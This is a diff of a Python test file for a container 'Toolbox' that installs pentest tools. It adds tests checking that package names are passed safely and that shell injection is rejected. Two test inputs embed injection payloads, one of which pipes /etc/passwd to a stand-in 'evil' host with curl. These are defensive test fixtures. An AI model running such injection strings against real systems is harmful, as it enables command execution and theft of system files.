@@ -112,26 +112,55 @@ def test_install_disabled(tmp_path, monkeypatch):
     assert "disabled" in result["error"]
 
 
+def _capture_runs(toolbox, monkeypatch) -> list[tuple[str, ...]]:
+    """Record the argv each install passes to ``_run`` (package as "$1", never
+    interpolated)."""
+    captured: list[tuple[str, ...]] = []
+
+    def fake_run(*args, timeout=0, check=False):
+        captured.append(args)
+        return 0, "", ""
+
+    monkeypatch.setattr(toolbox, "_run", fake_run)
+    return captured
+
+
 def test_install_builds_expected_scripts(tmp_path, monkeypatch):
-    captured: list[str] = []
     toolbox = Toolbox(_config(), tmp_path)
-    monkeypatch.setattr(
-        toolbox,
-        "exec_shell",
-        lambda script, timeout=600: captured.append(script) or {"ok": True, "output": ""},
-    )
+    captured = _capture_runs(toolbox, monkeypatch)
+
+    def last_script() -> str:
+        # argv: ("exec", container, "sh", "-lc", script, "--", <pkg...>)
+        return captured[-1][4]
 
     toolbox.install("apt", "smbclient")
-    assert "apt-get install" in captured[-1] and "smbclient" in captured[-1]
+    assert "apt-get install" in last_script()
+    assert captured[-1][-1] == "smbclient"
 
     toolbox.install("pip", "impacket")
-    assert "pip install" in captured[-1] and "impacket" in captured[-1]
+    assert "pip install" in last_script()
+    assert captured[-1][-1] == "impacket"
 
     toolbox.install("go", "github.com/x/y@latest")
-    assert "GOBIN=/workspace/tools/bin" in captured[-1]
+    assert "GOBIN=/workspace/tools/bin" in last_script()
 
     toolbox.install("git", "https://github.com/a/b.git")
-    assert "git clone" in captured[-1] and "/workspace/tools/b" in captured[-1]
+    assert "git clone" in last_script()
+    assert captured[-1][-1] == "b"  # clone destination
+
+
+def test_install_rejects_shell_metacharacters(tmp_path, monkeypatch):
+    toolbox = Toolbox(_config(), tmp_path)
+    _capture_runs(toolbox, monkeypatch)
+    result = toolbox.install("apt", "nmap; curl http://evil/$(cat /etc/passwd)")
+    assert result["ok"] is False
+    assert "unsafe" in result["error"]
+
+
+def test_which_rejects_injection(tmp_path, monkeypatch):
+    toolbox = Toolbox(_config(), tmp_path)
+    _capture_runs(toolbox, monkeypatch)
+    assert toolbox.which("nmap; curl evil") is None
 
 
 def test_up_without_docker_returns_error(monkeypatch, tmp_path):
